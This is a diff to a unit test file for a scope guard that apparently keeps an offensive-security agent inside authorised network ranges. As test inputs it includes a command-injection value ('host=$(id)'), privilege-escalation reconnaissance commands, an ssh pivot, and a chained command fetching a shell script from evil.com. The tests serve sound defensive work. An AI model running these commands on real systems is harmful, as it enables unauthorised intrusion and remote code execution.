@@ -1,6 +1,6 @@
 import unittest
 
-from modules.agent_offensive.guard import ScopeGuard, DEFAULT_ALLOW
+from modules.agent_offensive.guard import ScopeGuard, DEFAULT_ALLOW, session_scope_ok
 
 SCOPE = {"in_scope_cidrs": ["10.1.1.0/24"], "in_scope_domains": []}
 
@@ -42,6 +42,23 @@ class GuardTest(unittest.TestCase):
         v = self.g().vet(["curl", "-X", "POST", "http://10.1.1.5/internal/netcheck",
                           "--data-urlencode", "host=$(id)"])
         self.assertFalse(v.blocked)
+
+    def test_session_local_commands_allowed(self):
+        for cmd in ("id", "cat /home/web/user.txt", "sudo -l", "cat report.tar.gz",
+                    "find / -perm -4000 2>/dev/null", "curl http://127.0.0.1:8080/"):
+            ok, reason = session_scope_ok(cmd, SCOPE)
+            self.assertTrue(ok, f"{cmd} -> {reason}")
+
+    def test_session_in_scope_connection_allowed(self):
+        ok, _ = session_scope_ok("curl http://10.1.1.5/internal", SCOPE)
+        self.assertTrue(ok)
+
+    def test_session_pivot_blocked(self):
+        ok, reason = session_scope_ok("ssh user@10.9.9.9", SCOPE)
+        self.assertFalse(ok)
+        self.assertIn("10.9.9.9", reason)
+        ok2, _ = session_scope_ok("cat x; curl http://evil.com/shell.sh", SCOPE)
+        self.assertFalse(ok2)
 
     def test_judge_can_block_but_not_unblock(self):
         # judge says fine, but out-of-scope stays blocked
